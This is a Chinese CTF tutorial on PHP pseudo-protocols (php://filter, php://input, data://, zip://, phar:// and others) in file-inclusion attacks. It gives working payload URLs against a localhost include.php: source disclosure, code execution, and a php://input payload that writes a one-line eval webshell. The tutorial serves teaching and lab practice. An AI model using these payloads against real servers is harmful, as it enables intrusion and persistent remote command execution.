# php伪协议

###### 原理：在文件包含时，会执行php伪协议。

$$
—————————————————

file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
     php://stdin, php://stdout 和 php://stderr
     php://input
     php://output
     php://memory 和 php://temp
     php://filter
zlib:// — 压缩流

.....data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
——————————————————
$$



# file://协议

- **条件**：

  - `allow_url_fopen`:off/on
  - `allow_url_include` :off/on

- **作用**：
  用于访问本地文件系统，在CTF中通常用来**读取本地文件**的且不受`allow_url_fopen`与`allow_url_include`的影响。
  `include()/require()/include_once()/require_once()`参数可控的情况下，如导入为非`.php`文件，则仍按照php语法进行解析，这是`include()`函数所决定的。

- **说明**：
  `file://` 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 `fopen()` 和 `file_get_contents()`，`include_path `会可选地搜索，也作为相对的路径。

- **用法**：

  ```pgsql
  /path/to/file.ext
  relative/path/to/file.ext
  fileInCwd.ext
  C:/path/to/winfile.ext
  C:\path\to\winfile.ext
  \\smbserver\share\path\to\winfile.ext
  file:///path/to/file.ext
  ```

- **示例**：

  1. `file://[文件的绝对路径和文件名]`

     ```http
     http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
     ```

     ![图片描述](https://segmentfault.com/img/bVbrQAZ)

  2. `[文件的相对路径和文件名]`

     ```http
     http://127.0.0.1/include.php?file=./phpinfo.txt
     ```

     ![图片描述](https://segmentfault.com/img/bVbrQA1)

  3. `[http：//网络路径和文件名]`

     ```http
     http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
     ```

     ![图片描述](https://segmentfault.com/img/bVbrQBb)

- **参考**：[http://php.net/manual/zh/wrappers.file.php](https://link.segmentfault.com/?enc=Zs%2BV9V4IQjWtiWthYKTf7g%3D%3D.HSkQG0PoZxzinna9Q2UvU3B72JU4d5ibg7mMch63ACnyzAC8C0Ahq4V16VoueluX)

# php://协议

- **条件**：

  - `allow_url_fopen`:off/on
  - `allow_url_include` :仅`php://input php://stdin php://memory php://temp `需要on

- **作用**：
  `php://` 访问各个输入/输出流（I/O streams），在CTF中经常使用的是`php://filter`和`php://input`，`php://filter`用于**读取源码**，`php://input`用于**执行php代码**。

- **说明**：
  PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，
  内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

  | 协议                    | 作用                                                         |
  | ----------------------- | ------------------------------------------------------------ |
  | php://input             | 可以访问请求的原始数据的只读流，在POST请求中访问POST的`data`部分，在`enctype="multipart/form-data"` 的时候`php://input `是无效的。 |
  | php://output            | 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 |
  | php://fd                | (>=5.3.6)允许直接访问指定的文件描述符。例如 `php://fd/3` 引用了文件描述符 3。 |
  | php://memory php://temp | (>=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 `php://memory` 总是把数据储存在内存中，而 `php://temp` 会在内存量达到预定义的限制后（默认是 `2MB`）存入临时文件中。临时文件位置的决定和 `sys_get_temp_dir()` 的方式一致。 |
  | php://filter            | (>=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式`（all-in-one）`的文件函数非常有用，类似 `readfile()`、`file()` 和 `file_get_contents()`，在数据流内容读取之前没有机会应用其他过滤器。 |

- **`php://filter`参数详解**

  该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：

  | php://filter 参数         | 描述                                                         |           |
  | ------------------------- | ------------------------------------------------------------ | --------- |
  | resource=<要过滤的数据流> | 必须项。它指定了你要筛选过滤的数据流。                       |           |
  | read=<读链的过滤器>       | 可选项。可以设定一个或多个过滤器名称，以管道符（*\           | *）分隔。 |
  | write=<写链的过滤器>      | 可选项。可以设定一个或多个过滤器名称，以管道符（\            | ）分隔。  |
  | <; 两个链的过滤器>        | 任何没有以 *read=* 或 *write=* 作前缀的筛选器列表会视情况应用于读或写链。 |           |

- **可用的过滤器列表（4类）**

  此处列举主要的过滤器类型，详细内容请参考：[https://www.php.net/manual/zh/filters.php](https://link.segmentfault.com/?enc=wIZh8GGyRk3IEBh%2FUyUwzA%3D%3D.b6GiZXFMQmM5RkX2Dsjom4IZxNKVzsqmyV5i3GihFmQQ1jBc0kVnqXYmQd6sbGAu)

  | 字符串过滤器      | 作用                                        |
  | ----------------- | ------------------------------------------- |
  | string.rot13      | 等同于`str_rot13()`，rot13变换              |
  | string.toupper    | 等同于`strtoupper()`，转大写字母            |
  | string.tolower    | 等同于`strtolower()`，转小写字母            |
  | string.strip_tags | 等同于`strip_tags()`，去除html、PHP语言标签 |

  | 转换过滤器                                                   | 作用                                                       |
  | ------------------------------------------------------------ | ---------------------------------------------------------- |
  | convert.base64-encode & convert.base64-decode                | 等同于`base64_encode()`和`base64_decode()`，base64编码解码 |
  | convert.quoted-printable-encode & convert.quoted-printable-decode | quoted-printable 字符串与 8-bit 字符串编码解码             |

  | 压缩过滤器                        | 作用                                                         |
  | --------------------------------- | ------------------------------------------------------------ |
  | zlib.deflate & zlib.inflate       | 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 |
  | bzip2.compress & bzip2.decompress | 同上，在本地文件系统中创建 bz2 兼容文件的方法。              |

  | 加密过滤器 | 作用                   |
  | ---------- | ---------------------- |
  | mcrypt.*   | libmcrypt 对称加密算法 |
  | mdecrypt.* | libmcrypt 对称解密算法 |

- **示例**：

  1. `php://filter/read=convert.base64-encode/resource=[文件名]`读取文件源码（针对php文件需要base64编码）

     ```livecodeserver
     http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
     ```

     ![图片描述](https://segmentfault.com/img/bVbrQBf)

  2. `php://input + [POST DATA]`执行php代码

     ```php
     http://127.0.0.1/include.php?file=php://input
     [POST DATA部分]
     <?php phpinfo(); ?>
     ```

     ![图片描述](https://segmentfault.com/img/bVbrQBh)

     若有写入权限，写入一句话木马

     ```php
     http://127.0.0.1/include.php?file=php://input
     [POST DATA部分]
     <?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
     ```

     ![图片描述](https://segmentfault.com/img/bVbrQBi)

- **参考**：[https://php.net/manual/zh/wrappers.php.php](https://link.segmentfault.com/?enc=M1juvEoIxwaVBQUt7Tp6fw%3D%3D.tNdVZ1zzLh2RIgxaZ1qC%2FCbpUriZlH06YCeNMzk7XwFU2YRne3WaF0zmzDoHwkik)

# zip:// & bzip2:// & zlib://协议

- **条件**：

  - `allow_url_fopen`:off/on
  - `allow_url_include` :off/on

- **作用**：`zip:// & bzip2:// & zlib://` 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：`jpg png gif xxx` 等等。

- **示例**：

  1. `zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）

     压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传

     ```http
     http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
     ```

     ![图片描述](https://segmentfault.com/img/bVbrQBj)

  2. `compress.bzip2://file.bz2`

     压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）

     ```http
     http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
     ```

     ![图片描述](https://segmentfault.com/img/bVbrQBt)

  3. `compress.zlib://file.gz`

     压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）

     ```http
     http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
     ```

     ![图片描述](https://segmentfault.com/img/bVbrQBu)

- **参考**：[http://php.net/manual/zh/wrappers.compression.php](https://link.segmentfault.com/?enc=zJUyCYTLNfleI%2B8YOt%2BrYg%3D%3D.esu6o2ZLvqoGBGlX1twgTBF71uamzhsFwEf74uEXrPFdCYCQwtm0Jlv2Sl25FZlL21NhgufVnc5pp1NlAnnNoQ%3D%3D)

# data:// 协议

- **条件**：

  - `allow_url_fopen`:on
  - `allow_url_include` :on

- **作用**：自`PHP>=5.2.0`起，可以使用`data://`数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。

- **用法**：

  ```awk
  data://text/plain,
  data://text/plain;base64,
  ```

- **示例**：

  1. `data://text/plain,`

     ```http
     http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
     ```

     ![图片描述](https://segmentfault.com/img/bVbrQBB)

  2. `data://text/plain;base64,`

     ```http
     http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
     ```

     ![图片描述](https://segmentfault.com/img/bVbrQBD)

# http:// & https://协议

- **条件**：

  - `allow_url_fopen`:on
  - `allow_url_include` :on

- **作用**：常规 URL 形式，允许通过 `HTTP 1.0` 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。

- **用法**：

  ```awk
  http://example.com
  http://example.com/file.php?var1=val1&var2=val2
  http://user:password@example.com
  https://example.com
  https://example.com/file.php?var1=val1&var2=val2
  https://user:password@example.com
  ```

- **示例**：

  ```http
  http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
  ```

  ![图片描述](https://segmentfault.com/img/bVbrQBP)

# phar://协议

`phar://`协议与`zip://`类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：

```http
http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
```

![图片描述](https://segmentfault.com/img/bVbrQBX)

另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：**phar://协议对象注入技术**。

因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。
